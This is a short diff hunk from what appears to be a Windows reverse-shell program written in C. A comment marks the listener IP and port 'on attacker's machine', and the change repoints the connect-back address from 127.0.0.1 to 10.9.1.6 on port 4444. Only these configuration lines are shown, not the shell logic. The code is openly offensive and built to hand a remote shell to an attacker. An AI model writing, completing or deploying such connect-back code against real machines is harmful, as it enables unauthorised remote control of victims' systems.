@@ -16,7 +16,7 @@ PROCESS_INFORMATION pi;
 int main(int argc, char* argv[])
 {
   // listener ip, port on attacker's machine
-  char *ip = "127.0.0.1";
+  char *ip = "10.9.1.6";
   short port = 4444;
 
   // init socket lib
